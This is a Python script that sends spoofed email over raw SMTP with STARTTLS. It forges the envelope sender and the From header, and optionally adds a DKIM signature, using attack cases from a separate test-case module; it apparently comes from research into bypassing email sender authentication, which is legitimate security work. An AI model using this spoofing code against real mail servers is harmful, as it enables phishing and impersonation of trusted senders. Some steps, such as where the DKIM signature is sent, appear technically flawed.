import smtplib
from socket import *
import base64
import ssl
from config import *
import test_cases
import dkim
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import inspect



def mail_sender(attack_case):
    clientSocket = socket(AF_INET, SOCK_STREAM)
    print("Connecting to mail server")
    clientSocket.connect(receiving_mail_server)
    print_receiving_msg("connection", "220", clientSocket)

    # Send HELO command and print server response.
    ehlo = attack_case["ehlo"].decode()
    clientSocket.send(ehlo.encode())
    print_receiving_msg("EHLO", "250", clientSocket)

    #gmail needs to use TLS to start connection
    clientSocket.send(b'STARTTLS\r\n')
    print_receiving_msg("STARTTLS", "220", clientSocket)

    #if (tls_enabled):

    tlsSocket = ssl.wrap_socket(clientSocket, ssl_version=ssl.PROTOCOL_TLS)

    ##Login for attacker, not needed when we have email server
    #auth_msg = b'AUTH PLAIN '+base64.b64encode(b'\x00'+ sender_email.encode() +b'\x00'+password.encode())+b'\r\n'
    #print(auth_msg.decode())
    #tlsSocket.send(auth_msg)
    #print_receiving_msg_tls("Authentication", "235",tlsSocket)

    #SMTP MAIL FROM
    MAIL_FROM = attack_case["mailfrom"]
    print(MAIL_FROM)
    tlsSocket.send(MAIL_FROM)
    print_receiving_msg_tls("mail from", "250", tlsSocket)


    #SMTP RCPT TO
    RCPT_TO = attack_case["rcptto"]
    print(RCPT_TO)
    tlsSocket.send(RCPT_TO)
    print_receiving_msg_tls("rcpt to", "250", tlsSocket)

    #DATA command
    tlsSocket.send(b'DATA\r\n')
    print_receiving_msg_tls("data", "354", tlsSocket)

    #Message shown to user on UI
    fakefrom = attack_case["data"]["from_header"]
    print(fakefrom)
    tlsSocket.send(fakefrom)
    TO = attack_case["data"]["to_header"]
    print(TO)
    tlsSocket.send(TO)
    subject = attack_case["data"]["subject_header"]
    print(subject)
    tlsSocket.send(subject)
    body = attack_case["data"]["body"]
    endmsg = "\r\n.\r\n"
    print(body)
    tlsSocket.send(body)
    print(endmsg)
    tlsSocket.send(endmsg.encode())

    
    if "dkim" in attack_case.keys(): # if there is dkim
        dkim_para = attack_case["dkim"];
        print("preparing DKIM signature")
        f = open("dkimkey","r")
        pkey = f.read()
        print(pkey)

        headers = [b"To",b"From", b"Subject"]


        #print(body.decode())
        #print(type(body.decode()))
        #print(dkim_para["s"].decode())
        #print(type(dkim_para["s"].decode()))
        #print(dkim_para["d"].decode())
        #print(type(dkim_para["d"].decode()))
        #print(pkey)
        #print(type(pkey))
        #print(headers)
        #print(type(headers))

        message_html = ""
        MIMEmessage = MIMEMultipart("alternative")
        MIMEmessage.attach(MIMEText(body.decode(), "plain"))
        MIMEmessage.attach(MIMEText(message_html, "html"))
        MIMEmessage["To"] = TO.decode()
        MIMEmessage["From"] = fakefrom.decode()
        MIMEmessage["Subject"] = subject.decode()


        import inspect
        lines = inspect.getsource(dkim.sign)
        print(lines)

        sig = dkim.sign(
            message = MIMEmessage.as_string().encode(),
            selector=dkim_para["s"],
            domain=dkim_para["d"],
            privkey=pkey.encode(),
            canonicalize=(b'simple',b'relaxed'),
            include_headers=[b"from"],
        )
        print(sig)
        tlsSocket.send(sig)

    #quit command
    tlsSocket.send(b'quit\r\n')
    print_receiving_msg_tls("quit", "250", tlsSocket)
    tlsSocket.close()



#Read at most 1024 bytes from server and print out the message
def print_receiving_msg(request, exp_code, clientSocket):
    recv = clientSocket.recv(1024).decode()
    print("Message after " + request + " request: " + recv)
    if (recv[0:3] != exp_code):
        print(exp_code + ' reply not received from server.')

def print_receiving_msg_tls(request, exp_code, tlsSocket):
    recv = tlsSocket.recv(1024).decode()
    print("Message after " + request + " request: " + recv)
    if (recv[0:3] != exp_code):
        print(exp_code + ' reply not received from server.')




if __name__ == '__main__':
    print("Sending spoof emails based on test cases")
    print (test_cases.test_list["attack1"]["mailfrom"].decode())
    mail_sender(test_cases.test_list["attack2"])